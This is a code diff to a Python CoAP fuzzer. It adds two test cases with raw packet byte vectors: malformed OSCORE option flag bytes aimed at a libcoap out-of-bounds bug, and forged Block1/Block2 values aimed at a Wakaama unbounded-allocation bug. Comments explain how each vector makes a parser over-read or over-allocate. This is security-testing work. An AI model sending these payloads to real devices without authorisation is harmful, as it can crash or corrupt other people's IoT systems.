@@ -84,6 +84,18 @@ class CoAPFuzzer(BaseFuzzer):
             # Phase 3: CVE-targeted
             RequestInfo("CoAP_PDU_Attacks", "PDU parsing attacks", "cve"),
             RequestInfo("CoAP_Path_Traversal", "Path traversal attempts", "cve"),
+            RequestInfo(
+                "CoAP_OSCORE_Option_Malformed",
+                "OSCORE option (No.9) flag byte claims Partial-IV/kid-context/kid "
+                "lengths larger than the value present (CVE-2024-0962 OOB write)",
+                "cve",
+            ),
+            RequestInfo(
+                "CoAP_Block_Forged",
+                "Block1/Block2 (No.27/23) forged SZX + huge NUM + M-bit implying "
+                "oversized total, plus non-1-3-byte block value (CVE-2026-58465 alloc)",
+                "boundary",
+            ),
             # Phase 4: Boundary attacks
             RequestInfo("CoAP_Token_Boundary", "Token length boundary", "boundary"),
             RequestInfo("CoAP_Header_Boundary", "Header field boundaries", "boundary"),
@@ -408,6 +420,86 @@ class CoAPFuzzer(BaseFuzzer):
         )
         if self.is_request_enabled("CoAP_Path_Traversal"):
             self.session.connect(path_traversal)
+
+        # OSCORE option (No. 9) value fuzzing (CVE-2024-0962 libcoap OSCORE OOB).
+        # The OSCORE option value begins with a flag byte:
+        #   bits 0-2 (n) = Partial-IV length, bit 3 (k) = kid present,
+        #   bit 4 (h) = kid-context present, bits 5-7 reserved.
+        # A flag byte that claims a Partial-IV / kid-context / kid longer than the
+        # bytes actually in the option value drives the parser to read past it.
+        # Option 9 with no prior option -> delta nibble = 9 (0x9_).
+        oscore_option_malformed = Request(
+            "CoAP_OSCORE_Option_Malformed",
+            children=(
+                Group(
+                    name="oscore_flag_vectors",
+                    values=[
+                        # flag 0x1f (n=7,k=1,h=1) in a 1-byte value: claims 7-byte
+                        # Partial-IV + kid-context + kid, none present -> over-read.
+                        b"\x40\x01\x00\x09\x91\x1f",
+                        # flag 0x10 (h=1 kid-context) + ctx-len 0xff but 0 ctx bytes.
+                        b"\x40\x01\x00\x09\x92\x10\xff",
+                        # flag 0x05 (Partial-IV len 5) in a 1-byte value.
+                        b"\x40\x01\x00\x09\x91\x05",
+                        # flag 0x08 (k=1 kid) claims a kid past the value end.
+                        b"\x40\x01\x00\x09\x91\x08",
+                        # OSCORE option with extended length lying (13+0xf0=253
+                        # declared, 1 value byte present) on top of a n=7 flag.
+                        b"\x40\x01\x00\x09\x9d\xf0\x1f",
+                        # Max flag 0xff (all reserved bits + n=7,k,h) -> reserved-bit
+                        # + length over-read combined.
+                        b"\x40\x01\x00\x09\x91\xff",
+                    ],
+                ),
+            ),
+        )
+        if self.is_request_enabled("CoAP_OSCORE_Option_Malformed"):
+            self.session.connect(oscore_option_malformed)
+
+        # Block1/Block2 forged size-exponent + huge block-number (CVE-2026-58465
+        # Wakaama Block1 unbounded allocation). A Block option value encodes
+        # NUM (block number) in the upper bits, then M (more) at bit 3 and SZX
+        # (size exponent 0-7, block size = 2^(SZX+4)) in bits 0-2. A max NUM with
+        # M=1 and SZX=7 (1024-byte blocks) implies a total far larger than any
+        # datagram delivered, so a server that pre-allocates NUM*blocksize
+        # over-allocates. The CoAP Block value must be 1-3 bytes; a 4-byte value
+        # is itself malformed. Block1 (27) / Block2 (23) follow Uri-Path (11), so
+        # their deltas are 16 (ext 13+3 -> 0xd_) and 12 (0xc_) respectively.
+        block_forged = Request(
+            "CoAP_Block_Forged",
+            children=(
+                Group(
+                    name="block_forged_vectors",
+                    values=[
+                        # Block1 (27) forged: 3-byte value 0xffffff -> NUM=0xfffff,
+                        # M=1, SZX=7 -> oversized declared total (unbounded alloc).
+                        b"\x40\x03\x00\x40"
+                        + self._build_uri_path_option("upload")
+                        + b"\xd3\x03\xff\xff\xff",
+                        # Block1 (27) with a 4-byte value -> Block option length is
+                        # not the legal 1-3 bytes (malformed).
+                        b"\x40\x03\x00\x41"
+                        + self._build_uri_path_option("upload")
+                        + b"\xd4\x03\xff\xff\xff\xff",
+                        # Block2 (23) forged: 3-byte value 0xffffff, huge NUM+SZX=7.
+                        b"\x40\x01\x00\x42"
+                        + self._build_uri_path_option("large")
+                        + b"\xc3\xff\xff\xff",
+                        # Block1 (27) SZX=7 + M=1 with a mid-range NUM (0x1f6).
+                        b"\x40\x03\x00\x43"
+                        + self._build_uri_path_option("upload")
+                        + b"\xd2\x03\x1f\x6f",
+                        # Block2 (23) SZX=0 (16-byte blocks) but M=1 + max NUM ->
+                        # enormous block count.
+                        b"\x40\x01\x00\x44"
+                        + self._build_uri_path_option("large")
+                        + b"\xc3\xff\xff\xf8",
+                    ],
+                ),
+            ),
+        )
+        if self.is_request_enabled("CoAP_Block_Forged"):
+            self.session.connect(block_forged)
 
         # ============================================================
         # PHASE 4: BOUNDARY ATTACKS (5m - 10m)
